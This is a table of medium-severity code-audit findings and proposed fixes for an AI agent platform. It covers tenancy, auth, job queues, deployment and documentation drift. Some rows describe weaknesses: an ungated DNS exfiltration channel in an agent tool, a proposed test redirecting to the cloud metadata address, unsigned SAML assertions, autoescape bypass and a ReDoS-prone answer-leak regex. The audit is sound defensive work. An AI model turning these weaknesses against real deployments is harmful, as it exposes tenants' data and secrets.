| W4-44 | medium | core/privacy_ops (DPA review) | `packages/maverick-core/maverick/privacy_ops.py:990` | DPA reviewer credits Art. 28(3) clauses from generic words ('notif', 'audit', 'encrypt') | Require co-occurrence with the clause's subject within a window (e.g. breach: r'(personal.?data\|security).{0,40}breach' AND r'notif\|inform' within 200 chars; audit: r'audit.{0,60}(controller\|customer)\|right.{0,30}audit'; security: 'technical and organi[sz]ational' or 'article 32', not bare 'encrypt'), and downgrade single-keyword hits to 'unclear' instead of 'present'. Add regression tests with unrelated 'notify'/'audit'/'encrypt' sentences asserting status != 'present'. |
| W4-50 | medium | core/privacy_ops (DSAR) | `packages/maverick-core/maverick/privacy_ops.py:2504` | DSAR SLA clock is a flat 30 days for every kind and jurisdiction with no extension support | Add `regime` (gdpr/ccpa/…) and `extended_until`/`extension_reason` to the DSAR record; compute due_at with calendar-month arithmetic for GDPR and 45 days for CCPA; expose an audited `extend_dsar()` mutation and show extensions in the aging view. |
| W4-54 | medium | core/privacy_rights_consumer_delivery (public redeem) | `packages/maverick-core/maverick/privacy_rights_consumer_delivery.py:1604` | One-time consumer delivery burns the subject's limited redeem attempts on backend/resolver outages | Distinguish infrastructure failures from consumer errors: on resolver/authority exceptions raise a retryable 503-class error without touching attempts (or record a separate 'infra_failure' counter that does not count toward max_attempts), and only count attempts when the presented material was actually compared. Add tests where the binding resolver raises and assert attempts is unchanged. |
| W4-5 | medium | core/reachability | `packages/maverick-core/maverick/reachability.py:267` | reachability.lock.json is stale (295 modules missing, incl. 20/22 consent core modules and 33 dashboard consent modules) and --ci still passes; the docstring's doc-drift check does not exist | Make --ci fail when classify() contains modules absent from the lock (not only UNREACHED ones) and regenerate the lock; implement the promised FEATURES.md cross-check (fail when a backticked module name in FEATURES.md is TEST_ONLY/UNREACHED) or delete that sentence. |
| W4-33 | medium | core/reachability (governance-suite classification) | `packages/maverick-core/maverick/reachability.py:267` | reachability.lock.json is stale for 295 of 1,368 modules (34 of 44 ai_* modules absent) and the CI 'ratchet' cannot notice, contradicting the module's stated guarantee | Make --ci fail when any live module is missing from the lock (or when counts differ), propagate reachability from CLI_ONLY roots (classify CLI-reached modules as CLI_ONLY), implement or delete the FEATURES.md cross-check the docstring promises, and regenerate the lock (`python -m maverick.reachability --regen`) in the same PR. |
| W1-72 | medium | core/runner | `packages/maverick-core/maverick/runner.py:431` | Goal execution is funnelled through the asyncio default executor (cpu+4 threads), silently capping concurrency below MAX_CONCURRENT_GOALS and starving other to_thread users | Create a dedicated bounded ThreadPoolExecutor for goal runs sized to MAX_CONCURRENT_GOALS + a small waiter allowance and use loop.run_in_executor(goal_executor, ...) (contextvars copied via contextvars.copy_context().run), or call loop.set_default_executor at dashboard/server startup with an explicit size derived from the concurrency knobs. Surface executor saturation in /metrics. |
| W2-54 | medium | core/secrets | `packages/maverick-core/maverick/crypto_at_rest.py:581` | The most sensitive key material (at-rest key, KMS KEK, audit signing key, dashboard token, screenshot key) bypasses secret_provider and can only be supplied via process environment | Route every master-key/secret read through secret_provider.get_secret (file backend first, env fallback) and pop the env copy after first read as signing does; document the supported file names. |
| W1-75 | medium | core/server (channels) | `packages/maverick-core/maverick/server.py:295` | Channel server performs synchronous SQLite world writes on the shared asyncio loop of all channel adapters | Move the pre-dispatch world writes into one asyncio.to_thread(...) block (they already run inside the tenant scope which to_thread preserves), mirroring the existing companion-generation pattern. |
| W2-70 | medium | core/tenant/egress | `packages/maverick-core/maverick/tenant/egress.py:38` | Tenant egress policy fails OPEN when config.toml is unreadable (quotas/tenancy policies fail closed on the same condition) | Mirror quotas._quota_config: call config_source_errors() and raise (or return a deny-all policy) when an active config source is invalid; keep the fail-open only for 'no [egress] table at all'. |
| W2-71 | medium | core/tenant/registry + channels | `packages/maverick-core/maverick/tenant/registry.py:654` | Per-user tenancy is refused for every channel user as soon as one named tenant is provisioned; docs and code comments claim the opposite | Either (a) make is_active/assert_tenant_active admit ids that tenant_by_user_enabled() would generate (or add `[tenancy] by_user_requires_roster`), or (b) fix docs/multi-tenancy.md:77-79 and the server.py:182 comment, add a config-lint/doctor warning when by_user is on and a roster exists, and reject `maverick tenant create` / POST /admin/tenants with a clear error in by_user mode. |
| W2-72 | medium | core/tenant/registry + dashboard/rbac | `packages/maverick-core/maverick/tenant/registry.py:621` | Deleting a tenant leaves its RBAC memberships and workspace selections behind; a re-created tenant with the same id inherits the old members | Give registry.delete_tenant a cleanup hook (or have the dashboard DELETE route and SCIM path) remove the tenant's entries from rbac tenant roles, workspace selections, partner_store rows and the tenant's reservations file, and audit it. Alternatively make TenantRecord carry a creation nonce and key memberships by (id, nonce). |
| W5-83 | medium | core/tests-env-isolation | `packages/maverick-core/tests/test_provider_base_url_plumbing.py:33` | Provider-env test fixtures clear an incomplete list of variables — 5 suite failures whenever the host exports ANTHROPIC_BASE_URL | Add one shared fixture in the root conftest (`clean_provider_env`) that derives its list from `config.PROVIDER_BASE_URL_ENV_MAP` plus the key-var table in config.py, and use it in these four files; for subprocess tests pass a scrubbed env built by the same helper. |
| W4-89 | medium | core/third_party_executive_reports | `packages/maverick-core/maverick/third_party_executive_reports.py:854` | Executive PDF renderer overflows the page: body lines land below the footer / at the page edge once a report has ≥6 sources | Paginate by remaining vertical budget (`y - y_step < 60` → new page) instead of a fixed line count, and add a test asserting every `Td` y-coordinate is ≥ 50. |
| W4-86 | medium | core/third_party_intelligence | `packages/maverick-core/maverick/third_party_intelligence.py:4007` | Intelligence outbox re-lease of expired leases never counts an attempt and uses a predictable lease token | On expired-lease reclaim increment `attempt`, dead-letter when `attempt >= maximum_attempts` (mirror lifecycle.claim_callbacks 2640-2649), and derive the lease token from `secrets.token_urlsafe(32)` like the runtime/trc stores. |
| W4-85 | medium | core/third_party_intelligence_delivery | `packages/maverick-core/maverick/third_party_intelligence_delivery.py:173` | Alert delivery worker aborts the whole batch when a slow send outlives its lease (fail_outbox raises inside the except handler) | Wrap the `fail_outbox` call in its own try/except that records the outcome as `lease_lost` and continues; size the lease from the transport timeout (lease ≥ 2×SMTP_TIMEOUT + store overhead) or renew the lease before sending. |
| W4-87 | medium | core/third_party_intelligence_runtime | `packages/maverick-core/maverick/third_party_intelligence_runtime.py:917` | Feed-runtime `claim_jobs` re-leases expired jobs indefinitely without honouring `maximum_attempts` | In `claim_jobs`, when reclaiming a `leased`-and-expired row with `attempt >= maximum_attempts`, transition to `dead_letter` with `last_error_code='lease_expired_attempts_exhausted'` (as third_party_lifecycle.claim_callbacks does at 2640-2649) and audit it. |
| W2-5 | medium | core/tools | `packages/maverick-core/maverick/tools/shell.py:34` | shell.py opaque-mode git-diff gold-leak regex is superlinear (ReDoS) on model-supplied command | Anchor/bound the prefix: replace `[^\n;&\|]*?` with a bounded `[^\n;&\|]{0,200}?` or restructure to match `git` then tokenise the argument list in Python instead of one megaregex. Cap the command length before running the gold-leak patterns. |
| W2-91 | medium | core/tools/dns_lookup | `packages/maverick-core/maverick/tools/dns_lookup.py:82` | dns_lookup tool is an ungated DNS exfiltration channel that bypasses every egress control | In _run(), refuse when enterprise_enabled() unless the queried name matches [enterprise] allowed_hosts (or add a dedicated [enterprise] allow_dns knob), and apply tenant.egress.egress_allowed('dns_lookup', host); log an EGRESS_BLOCKED audit event on refusal. Mention DNS in enterprise.py's 'what it still does not cover' list until then. |
| W2-98 | medium | core/tools/http_fetch | `packages/maverick-core/maverick/tools/http_fetch.py:430` | http_fetch tool never follows redirects (pinned client hard-codes follow_redirects=False and no re-validated hop loop exists), so any 301/302 page returns the redirect stub | In _stream_fetch, loop up to N (e.g. 5) hops: on 3xx with Location, urljoin, re-run _preflight_fetch checks (enterprise, tenant, private-IP) on the new URL, open a fresh safe_client for it (new pin) and continue; strip Authorization/Cookie headers on cross-host hops; report the final URL. Cover with a test using a MockTransport chain including a redirect to 169.254.169.254 that must be refused. |
| W4-81 | medium | core/trc_continuous_evidence | `packages/maverick-core/maverick/trc_continuous_evidence.py:3114` | Continuous-evidence error classifier collapses every stock-provider failure into `collector_contract_error` | Check the specific subclasses first: map StockEvidenceAccessDenied→collector_access_denied (and treat as non-retryable/cancel), StockEvidenceUnavailable/EvidenceCollectorUnavailable→collector_unavailable, StockEvidenceProtocolError→collector_contract_error, and carry `str(error)` (already a closed reason code) into the job error_code. |
| W4-82 | medium | core/trc_stock_evidence_collectors | `packages/maverick-core/maverick/trc_stock_evidence_collectors.py:1224` | AWS Security Hub stock collector speaks the wrong wire protocol (JSON-1.1 X-Amz-Target on POST / instead of REST POST /findings) | Use `method, path = "POST", "/findings"` with `Content-Type: application/json` (body `{"MaxResults":..,"NextToken":..}`), drop X-Amz-Target for Security Hub, keep SigV4 signing (sign `content-type`, `host`, `x-amz-date`); add a contract test pinned to the botocore service model (protocol=rest-json, requestUri=/findings). |
| W2-76 | medium | core/ux_store + dashboard | `packages/maverick-core/maverick/ux_store.py:211` | ux_store.shared() (dashboard pins/gallery) pins its file to whichever tenant made the first request in the process | Re-key ux_store._shared (and learning/router_v3 for consistency) as `dict[Path, Store]` resolved from data_dir() at each shared() call, matching procedural_memory.shared(). |
| W4-83 | medium | core/vendor_management | `packages/maverick-core/maverick/vendor_management.py:269` | Hosted-form questionnaire bearer tokens are stored in plaintext and returned by the vendor list/detail API | Store `token_sha256` in the record and return the raw token only once from `request_questionnaire`; resolve `/form/{token}` by hashing the presented token; redact the field in list/get responses (or at least strip it in the API layer). |
| W1-70 | medium | core/worker | `packages/maverick-core/maverick/worker.py:344` | Worker.run_once re-executes a job whose handler already succeeded when complete() raises (duplicate side effects on the normal path, not only reclaim) | Split the terminal write out of the handler try: on complete() failure retry the UPDATE with backoff (it is idempotent and fenced on attempts), and only if it still fails leave the row 'running' (lease reclaim will handle a genuine crash) rather than calling fail(). Persist a durable 'handler_done' marker in the payload before complete() so a reclaimed/retried job can short-circuit. Add the scratch test as a regression test. |
| W1-50 | medium | core/world_model | `packages/maverick-core/maverick/world_model.py:2278` | Episode retention aborts with FOREIGN KEY constraint failed whenever a fact references an episode (canonical path) or silently orphans facts (db_path path) | In purge_episodes_before (both backends) null out `facts.source_episode_id`/`fact_history.source_episode_id` for the purged ids in the same transaction (or declare the FKs ON DELETE SET NULL in a new migration), and make _purge_table_by_time set `PRAGMA foreign_keys = ON` so the two paths agree. Add a test that purges an episode cited by a fact. |
| W1-56 | medium | core/world_model | `packages/maverick-core/maverick/world_model.py:1464` | SQLite migrations are not applied atomically: a failing multi-statement migration leaves earlier statements committed with the version unbumped | Wrap _apply_migrations in an explicit `BEGIN IMMEDIATE` ... commit/rollback per version (or for the whole ladder), so a failure rolls back every statement of that version; keep the duplicate-column tolerance for legacy partially-applied DBs. Add a test mirroring the reproduction. |
| W1-49 | medium | core/world_model_backends | `packages/maverick-core/maverick/world_model_backends/postgres.py:2246` | PostgresWorldModel.list_goals lacks project_id/domain filters: the project detail page 500s on Postgres | Add `domain` and `project_id` predicates to PostgresWorldModel.list_goals; include in the parity test. |
| W2-73 | medium | core/world_model_backends/pg_rls + cli | `packages/maverick-core/maverick/world_model_backends/pg_rls.py:124` | `maverick tenant backfill` writes the raw tenant id while the runtime scopes rows by the percent-encoded segment, so backfilled rows stay invisible for any non-slug id | In pg_rls.backfill (or the CLI) canonicalize with `_tenant_segment(bind_tenant_namespace(canonical_tenant_id(tenant_id)))` before writing, and print both the raw and stored forms; have backfill refuse (or set the GUC) when RLS is already forced. |
| W3-22 | medium | dashboard/api input validation | `packages/maverick-dashboard/maverick_dashboard/api_schemas.py:344` | No global request-body cap and unbounded JSON fields (FactIn, AnswerIn, OutcomeIn.kind, ScheduleIn/TriggerIn params, FlowSaveIn.flow ...) — a 30 MB fact is accepted and echoed back by GET /api/v1/facts | Add one outermost middleware enforcing a default Content-Length/stream cap (e.g. 1-4 MB) for POST/PUT/PATCH outside the explicit large-body allowlist; add Field(max_length=...) to FactIn (key<=256, value<=64k), AnswerIn.answer, OutcomeIn.kind, param dict values, etc.; paginate or cap GET /api/v1/facts and require the 'view' permission explicitly. |
| W3-23 | medium | dashboard/app chat uploads | `packages/maverick-dashboard/maverick_dashboard/app.py:7670` | /chat/send reads every uploaded file fully into memory before the size check (up to N x 100 MB per request) | Mirror upload_attachment: `data = await f.read(MAX_FILE_BYTES + 1)` and raise 400 when len(data) > MAX_FILE_BYTES before calling store(); also enforce the per-goal total (existing_total) before reading the next part. |
| W3-20 | medium | dashboard/app projects | `packages/maverick-dashboard/maverick_dashboard/app.py:2807` | POST /chat/goal/{id}/project 500s on a non-numeric project_id and files goals under nonexistent or foreign projects | Parse with try/except -> 400, then `project = w.get_project(pid)`; 404 when missing, and apply the same owner rule project_detail uses (`project['owner'] in ('', owner)`), before calling set_goal_project. Add tests for 'abc', missing id and cross-owner id. |
| W2-77 | medium | dashboard/auth | `packages/maverick-dashboard/maverick_dashboard/auth.py:399` | Dashboard silently drops per-user tenancy when an env/client tenant floor is set, while the channel server still isolates per user | Either nest per-user tenants under the floor (`<floor>/api:<principal>` -- the path encoder already supports it) on both surfaces, or refuse to start / log an ERROR in doctor and config-lint when by_user is enabled together with a tenant floor. |
| W2-15 | medium | dashboard/auth (SAML) | `packages/maverick-dashboard/maverick_dashboard/saml.py:171` | SAML config allows want_assertions_signed=false while want_response_signed is hard-coded False, so a misconfiguration accepts unsigned assertions | Refuse to enable SAML when want_assertions_signed is false unless want_response_signed is true (expose the latter as a knob), log/assert at startup, and add a wizard/docs warning. Alternatively drop the knob entirely and always require signed assertions. |
| W2-17 | medium | dashboard/auth (SAML) | `packages/maverick-dashboard/maverick_dashboard/saml.py:544` | SAML ACS/login rebuild the pysaml2 client (remote IdP metadata fetch) per request and run verification synchronously in the async handler | Build and cache the Saml2Client once per config (refresh on a timer), and run prepare_login_redirect/verify_acs_response via run_in_threadpool. |
| W2-10 | medium | dashboard/auth (exemption lists) | `packages/maverick-dashboard/maverick_dashboard/app.py:1350` | /consent/webhook is exempt from the bearer middleware but not from the global auth dependency, so every CMP delivery 401s on any authenticated deployment | Add "/consent/webhook" to auth._SELF_AUTH_EXEMPT_PATHS (or derive one shared set: have app._AUTH_EXEMPT import from auth so the two lists cannot drift) and add a test that posts to /consent/webhook with MAVERICK_DASHBOARD_TOKEN set and expects the route's own 401/403 HMAC outcome, not the dependency's. |
| W2-16 | medium | dashboard/auth (invites) | `packages/maverick-dashboard/maverick_dashboard/invite_routes.py:152` | SSO-mode invite acceptance binds whichever principal is signed in, never checking the invited email | In SSO mode require a match between inv.email and the session identity (compare against the email/preferred_username/upn claims recorded by subject_directory at login, or store the OIDC claims on the session), or at minimum allow an admin to opt in to strict email binding and log a warning when the accepting principal differs from the invitee. |
| W2-9 | medium | dashboard/auth (proxy SSO) | `packages/maverick-core/maverick/proxy_auth.py:87` | Documented proxy-SSO setup (trusted_proxies=["127.0.0.1"]) is non-functional under uvicorn defaults when the proxy sets X-Forwarded-For | Same root-cause fix as the spoof finding (peer-authoritative proxy_trusts / uvicorn proxy_headers policy tied to [auth.proxy]). Until then, document that proxy SSO requires uvicorn to be run with proxy-headers disabled or FORWARDED_ALLOW_IPS unset, and add the ASGI-level test. |
| W1-74 | medium | dashboard/automation_queue + core/automation_events | `packages/maverick-core/maverick/automation_events.py:611` | Automation tick holds a blocking, untimed flock while polling sources; IMAP source has no socket timeout, so one hung mailbox wedges every automation thread silently | Pass timeout= (e.g. 30s) to imaplib.IMAP4/IMAP4_SSL and wrap login/select/fetch in the same bound; give _poll_guard a bounded acquisition (try LOCK_NB with a short retry budget, and skip the tick with a warning when the lock is held past N seconds); consider a per-tick watchdog that stops heartbeating when a poll exceeds a hard ceiling so reclaim can recover. |
| W2-78 | medium | dashboard/automation_queue + core/postgres | `packages/maverick-dashboard/maverick_dashboard/automation_queue.py:252` | Unbound base-namespace maintenance pass writes NULL-tenant rows that every tenant can read in the default (non-strict) Postgres mode | Skip the unbound base pass when a roster exists and no floor is configured (only iterate provisioned tenants), and have doctor/config-lint warn when list_tenants() is non-empty on Postgres but strict_tenant_isolation is off. Consider defaulting strict mode on whenever tenant_registry.json exists. |
| W3-72 | medium | dashboard/templates | `packages/maverick-dashboard/maverick_dashboard/templates/_hero.html:33` | hero()/state() macros mark title/lede/copy \|safe, and callers concatenate runtime values into them — autoescape is bypassed for anything passed there | Remove \|safe from the macro slots. Where callers need inline markup (<strong>, <code>), either (a) build the value with Markup in the caller: {{ state(..., copy=('Sandbox: <code>%s</code>' \| safe) \| format(perm.sandbox.backend \| e)) }} is awkward, so better (b) give the macros explicit escaped slots (e.g. state(label, name, copy_prefix, copy_value, copy_suffix) or a nested {% call %} body) so raw values are always escaped by autoescape, and keep \|safe only for literal template strings. Add a test that renders users.html with default_role='<s>x</s>' and asserts the tag is escaped. |
| W5-59 | medium | demo apps | `pyproject.toml:100` | demo/ ships 17 test files (168 tests) that no pytest invocation or CI job ever collects | Add "demo" to testpaths (or a dedicated `demo` CI job) and mark demo tests that need the platform with a marker; fix the subprocess env inheritance per finding 1 so they pass. |
| W5-9 | medium | dependencies/automation | `.github/dependabot.yml:58` | Dependabot covers only four ecosystems/directories; Go, Docker, Terraform, NuGet, Maven, Swift and most Cargo/npm trees are unmonitored | Add `gomod` (/go/model-proxy, /examples/clients/go), `docker` (/deploy/docker, /demo/*), `terraform` (/deploy/aws/terraform), `nuget`, `maven`, `swift`, additional `cargo` directories (apps/desktop/src-tauri, apps/installer-desktop/src-tauri, apps/desktop-runtime, examples/clients/rust) and additional `npm` directories, grouped weekly like the existing entries. |
| W5-41 | medium | deploy/ci | `packages/maverick-core/tests/test_release_packaging.py:622` | No CI gate validates Helm/Terraform/compose assets — only version strings are asserted | Add a `deploy-assets` workflow job: `helm lint` + `helm template` (default and with ingress/networkPolicy/serviceMonitor enabled) piped to kubeconform, `terraform fmt -check` + `terraform init -backend=false` + `terraform validate` (+ tflint/checkov), `docker compose -f ... config` for the three compose files, and hadolint on the Dockerfiles. |
| W5-30 | medium | deploy/helm | `deploy/helm/maverick/values.yaml:153` | Helm chart advertises ingress.* values but ships no Ingress template — ingress.enabled=true is a silent no-op | Add templates/ingress.yaml (networking.k8s.io/v1, using .Values.ingress.className/annotations/hosts/tls) or delete the ingress block from values.yaml and the README mention. Add a `helm template --set ingress.enabled=true \| grep 'kind: Ingress'` assertion to the packaging tests. |
| W5-36 | medium | deploy/observability | `deploy/observability/prometheus-rules.yaml:81` | Prometheus alert rules apply increase() to gauges (maverick_queue_jobs, maverick_goals_total) — dead-letter and failure-rate alerts fire on noise or miss real events | Either expose true counters (maverick_goal_transitions_total{status}, maverick_queue_job_failures_total) from health_routes.py and alert on those, or rewrite the rules with gauge-safe expressions (e.g. `delta()`/`max_over_time - min_over_time` or `maverick_queue_jobs{status="failed"} > 0`), rename maverick_goals_total to maverick_goals (Prometheus naming convention), and update grafana-dashboard.json panel 3. |
| W5-31 | medium | deploy/terraform | `deploy/aws/terraform/secrets.tf:15` | Secrets Manager entries use recovery_window_in_days = 0 (immediate, unrecoverable deletion) | Remove recovery_window_in_days = 0 (default 30) or set 7 on every secret; add lifecycle { prevent_destroy = true } on the two out-of-band secrets (anthropic_api_key, oidc_client_secret). |
| W5-32 | medium | deploy/terraform | `deploy/aws/terraform/efs.tf:10` | EFS 'operating state' volume has no backup policy despite prevent_destroy comment | Add `resource "aws_efs_backup_policy" "state" { file_system_id = aws_efs_file_system.state.id; backup_policy { status = "ENABLED" } }` (AWS Backup default plan, 35-day retention) and document the restore procedure in docs/vendor-onboarding.md. |
| W5-35 | medium | deploy/terraform | `deploy/aws/terraform/secrets.tf:104` | Assembled Postgres DSN omits sslmode — the stack's own DB connection does not follow deploy/postgres/README.md's verify-full guidance | Append `?sslmode=verify-full&sslrootcert=/etc/ssl/certs/aws-rds-global-bundle.pem` to the DSN and COPY the AWS RDS CA bundle into deploy/docker/Dockerfile (or at least `sslmode=require`); add an aws_db_parameter_group with rds.force_ssl=1 so the guarantee does not depend on engine defaults. |
| W5-39 | medium | deploy/terraform | `deploy/aws/terraform/codebuild.tf:69` | Production image built by CodeBuild uses the floating python:3.12-slim base while the GitHub release pins a digest — two different supply-chain postures for the 'same' image | Add a PYTHON_DIGEST environment_variable to aws_codebuild_project.image (kept in sync with release.yml, ideally sourced from one file) and pass `--build-arg PYTHON_DIGEST=$PYTHON_DIGEST`; optionally cosign-sign the ECR image in post_build and fail the build on ECR scan findings. |
| W5-40 | medium | deploy/vps | `deploy/vps/maverick.service:19` | VPS systemd unit hardcodes ~/maverick-workspace and a mandatory EnvironmentFile — the service fails to start if the wizard chose another workdir or wrote no .env | Render WorkingDirectory/ReadWritePaths from the wizard's chosen sandbox.workdir in install_service() (read config.toml with python -c), use `EnvironmentFile=-/home/%i/.maverick/.env`, and add a `systemd-analyze verify` + `systemctl start` smoke check at the end of install.sh. |
| W5-11 | medium | docker/base-image | `deploy/docker/Dockerfile:19` | Container base-image digest is a 5-week-old build-arg duplicated in three places with no refresh automation; Dockerfile default floats | Move the digest into the Dockerfile (`FROM python:3.12-slim@sha256:... AS wheel-builder`), drop the build-arg indirection, enable Dependabot `docker` for /deploy/docker and /demo, and reference the same digest in agent-on-pr.yml via a single source (e.g. a `deploy/docker/base-image.txt` read by both workflows with a test asserting equality). |
| W4-4 | medium | docs/FEATURES + reachability | `docs/FEATURES.md:3022` | FEATURES.md cites consent_standards.py and consent_ergonomics.py as shipped capability; both are TEST_ONLY (nothing in production imports them) | Either wire consent_standards.detect_privacy_headers into consent_public_api's GPC/DNT capture (and consent_ergonomics into tools/consent_ergonomics), or move both entries in FEATURES.md to a 'library/roadmap' section. Add the promised doc check (see reachability finding). |
| W4-34 | medium | docs/FEATURES vs ai_benchmark_coordinator | `docs/FEATURES.md:1369` | FEATURES.md presents the benchmark coordinator as shipped capability although nothing in production or the CLI imports it (live class TEST_ONLY) | Either wire the coordinator behind an explicit opt-in (config knob + wizard step + dashboard/CLI entry) or move the paragraph describing it to a roadmap/experimental section and mark the module experimental. Re-run the reachability ledger after the change. |
| W5-109 | medium | docs/api | `docs/api.md:182` | docs/api.md is stale on two load-bearing facts: SSE 'may be added in v0.2' (it exists) and default caps '$2, 30min' (code: $5, 3600s) | Fix the defaults sentence to '$5, 1h' (or lower the code defaults to match the documented conservative posture) and document the SSE stream endpoint (plus `MAVERICK_DASHBOARD_MAX_SSE`) in the Goals table. |
| W5-100 | medium | docs/architecture | `docs/architecture.md:34` | Schema version stale in three architecture docs: 'v23' vs actual SQLite head v33 | Replace the literal with the live value (or a sentence like 'schema head: see `maverick version`') in README.md:179, ARCHITECTURE.md:43, docs/architecture.md:34; add a small doc-lint test that greps these three files for `schema v(\d+)` and asserts it equals `max(world_model.MIGRATIONS)`. |
| W3-51 | medium | docs/cli-reference | `docs/self-learning.md:272` | Two documented commands do not exist: `maverick approve` and `maverick replay` | Replace `maverick approve` with the actual path (dashboard approvals queue / `maverick refine apply --approval-id`), and `maverick replay` with `maverick diag replay`; add the scratch docs-vs-click-tree diff as a CI check (docs mention -> command exists). |
| W5-105 | medium | docs/community | `docs/showcase.md:33` | Public showcase page tells submitters to run `maverick replay`, which is not a top-level command (it is `maverick diag replay`) | showcase.md:33 -> `maverick diag replay`; self-learning.md:272 -> name the real surface (dashboard /approvals queue or the actual CLI verb) or remove the claim. |
| W5-37 | medium | docs/deployment | `docs/deployment.md:43` | docs/deployment.md tells users to run ghcr.io/daybreak-ai-labs/lightwork:latest, but the release workflow never publishes a :latest tag | Change docs/deployment.md:43 to `ghcr.io/daybreak-ai-labs/lightwork:0.1.7` (or `@sha256:` digest) and reference deploy/verify-release.sh; alternatively publish a `latest` tag deliberately in release.yml if floating tags are wanted. |
| W5-38 | medium | docs/deployment | `docs/deployment.md:57` | docs/deployment.md VPS section describes wizard behavior that does not exist (generated systemd unit, Caddy config, /etc/maverick/config.toml) | Rewrite docs/deployment.md lines 53-69 to describe install.sh's actual behavior (unit rendered from deploy/vps/maverick.service, config under $TARGET_HOME/.maverick, Caddyfile is a manual copy), and drop or implement the Caddy step in install.sh. |
| W5-106 | medium | docs/external-agents | `docs/external-agents.md:75` | Documented endpoint `POST /api/v1/external-agents/{id}/revoke` is not registered (OpenAPI has release/reset-budget/credentials/DELETE only) | Either add the `POST /external-agents/{agent_id}/revoke` route (mirroring the CLI `revoke`/`restore` pair) to the external-agents router, or correct the doc to the real REST verb (`DELETE /api/v1/external-agents/{id}` if that is the intended revocation) and mention the CLI. |
| W5-107 | medium | docs/index | `docs/index.md:27` | docs/index.md (public landing page) has a broken bullet: the channel list is split across two other bullets | Move lines 43 back under the Multi-channel bullet (and update the list to the 17 wired channels). |
| W5-108 | medium | docs/learning | `docs/index.md:50` | factory-learn default contradicts across README, docs/index.md and docs/architecture.md (code: default-on) | Correct docs/index.md:50 and docs/architecture.md:83-86 to 'on by default; disable with `[self_improvement] factory_learning = false`' (or whichever is the intended product decision) and keep README consistent. |
| W5-101 | medium | docs/marketing | `docs/index.md:6` | Suite count contradicts code and itself: '53 business suites' (README/index/press-kit/FEATURES) vs 54 in code and comparison.md | Update README.md:22, docs/index.md:6, docs/press-kit.md:28, docs/FEATURES.md:1498 to 54 and derive the number in a test (`len(SUITE_PREFIXES)` vs grep of the docs) so the next suite addition can't drift. |
| W5-8 | medium | docs/release | `ARCHITECTURE.md:161` | ARCHITECTURE.md describes a release pipeline that no longer exists (PYPI_API_TOKEN, six packages, :latest/:vX.Y image tags, 'squatted' PyPI name) | Rewrite ARCHITECTURE.md 'Distribution channels' from release.yml/publish.yml (eight packages, OIDC, single immutable `:<version>` tag, draft-then-finalize flow, cosign bundles for Python artifacts) and add it to test_customer_surfaces_do_not_reference_the_retired_repository_owner-style doc drift tests (e.g. assert the doc does not mention PYPI_API_TOKEN or ':latest'). |
| W5-110 | medium | docs/sandbox | `pitch/SECURITY-QUESTIONNAIRE.md:95` | Firecracker is counted as a shipped sandbox/deploy target in seven docs (incl. the security questionnaire) while README and the code call it a scaffold that raises NotImplementedError | State '8 sandbox backends (+ Firecracker scaffold)' consistently, and in SECURITY-QUESTIONNAIRE 6.5/5.3 mark Firecracker as experimental; CODE_QUALITY_AUDIT already downgraded the module itself, the docs never followed. |
| W5-104 | medium | docs/security | `docs/security/threat-model.md:127` | Public threat model cites a nonexistent command `maverick skills install` (real: `maverick skill install` / `skill add`) | Change to `maverick skill add` (hash-verified catalog install) in threat-model.md:127 and fix skill-index.md:4,74,81 to `maverick skill browse` / `maverick skill add`; consider adding a `skills` -> `skill` alias so both spellings resolve. |
| W2-11 | medium | docs/security-hardening (proxy SSO) | `docs/security-hardening.md:631` | docs/security-hardening.md still says proxy SSO trusts loopback by default; code refuses it unless trust_loopback=true | Rewrite the section: default is refuse-all; either pin trusted_proxies or set [auth.proxy] trust_loopback = true; include the uvicorn FORWARDED_ALLOW_IPS caveat from the proxy-header findings. |
| W1-104 | medium | installer wizard / sandbox/kubernetes | `apps/installer-cli/maverick_installer/wizard.py:5158` | Wizard-generated kubernetes config never runs a command: the backend fails closed on allow_network=false and the wizard does not ask for it | In the wizard's kubernetes branch prompt for allow_network with the NetworkPolicy instructions (or emit the deny-all manifest and set allow_network=true), and validate the config with a dry exec. Better: make the backend apply/verify a NetworkPolicy itself. |
| W1-27 | medium | kernel/agent-loop (coding mode) | `packages/maverick-core/maverick/agent.py:3621` | Coding-mode 'one retry max' is dead: _patch_validated is reset on every new FINAL, so the apply-check / test-driven reject loop only ends at max_steps | Track revision attempts in a counter that is NOT reset per FINAL (e.g. `self._patch_revisions += 1` on each rejection, cap at 1-2), keep the per-FINAL reset only for the 'skip re-extraction' purpose, and add a test asserting the coding-mode reject loop terminates after N revisions independent of max_steps. |
| W1-30 | medium | kernel/budget + orchestrator | `packages/maverick-core/maverick/orchestrator.py:1527` | An unpriced model (UnpricedModelError) is reported to the user as 'hit your spending or time limit ... resume with a higher cap' | Catch UnpricedModelError before BudgetExceeded in both handlers (and in the result.error re-check at 1652-1667) and return the pricing message verbatim with the remediation ('add a ModelPrice to the rate card or set [budget] strict_pricing=false'); tag failure_telemetry/reflexion with class 'unpriced_model'. Also preflight the orchestrator/worker models at run_goal start so the run fails before MCP startup and brief enrichment spend. |
| W1-29 | medium | kernel/spawn | `packages/maverick-core/maverick/tools/spawn.py:527` | spawn_swarm silently truncates the requested agents to the fan-out cap; the tool result never tells the model which sub-tasks were dropped | Return the drop explicitly in the tool result (e.g. a leading '[swarm] NOTE: N of M requested agents were not run (fan-out cap C at depth D): <task previews>; re-issue them in a later call or do them yourself') and post it as a 'plan' entry; consider also re-rendering new blackboard entries since the last turn as a compact delta in each user turn so later cap/seal/denial notes reach the orchestrator. |
| W5-111 | medium | pitch | `pitch/AUDIENCE-C.md:108` | Pitch collateral claims 'native installers for Windows / macOS / Linux' that README, press-kit and FEATURES.md explicitly say are not shipped | Rewrite the 'installable today' bullets in AUDIENCE-B/C, ONE-PAGER, SEED-DECK and SECURITY-QUESTIONNAIRE to match README's Status section (reviewed source + PyInstaller binaries when attached to a release; installers are engineering scaffolds). |
| W5-102 | medium | pitch/marketing | `pitch/ONE-PAGER.md:38` | Pack count '2,020' stale in all pitch collateral, FEATURES.md and the public enterprise architecture page (code: 2,031) | Sweep the eleven files to 2,031 and reference a single source (e.g. `docs/FEATURES.md` count) from pitch material; add the pitch dir to whatever check reconciled the count last time (FIXES.md:17). |
| W5-103 | medium | pitch/security-questionnaire | `pitch/SECURITY-QUESTIONNAIRE.md:143` | `maverick proof-pack` does not exist as a CLI command but is the headline 'prove it' instruction in six pitch/security-questionnaire docs | Either register `proof-pack` as a Click command wrapping `maverick.proof_pack.main` (one-line group registration in cli/) or change the six docs to `python -m maverick.proof_pack`. Registering the command is the better fix since the docs are already distributed. |
